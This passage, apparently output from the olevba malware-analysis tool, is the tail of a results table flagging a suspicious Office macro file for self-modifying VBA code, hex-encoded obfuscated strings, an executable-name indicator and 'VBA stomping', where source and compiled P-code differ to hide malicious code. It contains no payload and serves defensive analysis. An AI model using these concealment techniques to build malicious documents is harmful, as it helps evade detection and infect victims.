|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

